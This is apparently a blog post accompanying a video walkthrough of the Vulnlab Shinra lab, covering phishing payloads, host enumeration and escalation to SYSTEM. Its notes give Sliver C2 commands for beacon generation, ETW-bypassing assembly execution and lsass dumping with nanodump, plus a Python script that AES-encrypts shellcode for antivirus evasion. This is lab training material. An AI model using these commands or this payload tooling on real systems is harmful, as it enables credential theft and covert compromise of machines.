---
categories:
- Vulnlab
image:
  path: https://img.youtube.com/vi/Mtox3EHeYk4/0.jpg
layout: post
media_subpath: /assets/posts/2023-01-18-vl-shinra-those-pesky-humans-initial-payload-design-host-enumeration-getting-system
tags:
- active directory
- c2
- evasion
- phishing
- runas
- windows
title: VL Shinra Part 3 - Initial Payload Design, Host Enumeration & getting
  SYSTEM
---

This is the third video of the Shinra series. We will get a shell on Ashleighs machine & escalate privileges.

{% youtube Mtox3EHeYk4 %}

## Topics

- Phishing: Payload design & getting a shell
- Sliver Basics
- Host enumeration
- Switching users with runas
- Exploiting SeDebugPrivilege to get SYSTEM
- Post Exploitation

Additional things to try on the lab:

- See if you can run the domain enumeration steps on client01 in contrast to using your own machine, e.g. port-scanning, bloodhound, adcs, credential spraying etc.
- Craft a payload using any other technique so it gets around the AV
- Craft a payload using indirect syscalls or modify the existing one so it uses DLL Hijacking instead

## Notes

**Sliver**

```terminal
# generate a beacon
generate beacon --mtls 127.0.0.1:53 --os windows --arch amd64 --format shellcode --save xct.raw

# start listener
mtls --lport 53

# execute assembly (in-process, bypasss ETW)
execute-assembly -i -E /home/xct/drop/Rubeus.exe klist|triage|...

# nanodump via armory
ps (list lsass process id)
nanodump 680 core.dmp 1 PMDM

# interactive shell (you can omit the argument to get powershell)
shell --shell-path "c:\\windows\\system32\\cmd.exe"
```

**Encrypt Shellcode with AES**

```python
from base64 import b64encode, b64decode
from binascii import unhexlify, hexlify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import sys

if __name__ == "__main__":
	if len(sys.argv) < 3:
		print("Usage: ./shellcode_encrypt file key iv")
		exit(1)

	file_name = sys.argv[1]
	password = sys.argv[2].encode()
	iv = sys.argv[3].encode()

	data = []
	with open(file_name,"rb") as f:
		data = f.read()

	print(f"Key: {password}")
	print(f"IV: {iv}")	
	print(f"Data: {data[:16]}..")

	data = pad(data, AES.block_size)
	cipher = AES.new(password, AES.MODE_CBC, iv)
	cipher_text = cipher.encrypt(data)

	with open('xct.bin','wb') as f:
		f.write(cipher_text)
```